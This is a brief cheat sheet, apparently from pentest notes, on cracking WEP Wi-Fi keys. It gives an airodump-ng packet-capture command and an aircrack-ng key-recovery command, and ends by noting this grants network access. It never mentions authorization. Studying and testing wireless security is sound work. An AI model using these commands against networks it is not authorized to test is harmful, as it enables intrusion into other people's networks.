# WEP Cracking

WEP is an outdated and insecure encryption protocol. Cracking WEP involves capturing enough packets to guess the key.

## Commands

#### 1) Capture packets

    airodump-ng --bssid BSSID -c CHANNEL -w capture wlan0mon

#### 2) Attempt to crack the WEP key using captured packets

    aircrack-ng capture*.cap

After capturing enough packets, you successfully crack the WEP key and gain access to the network.
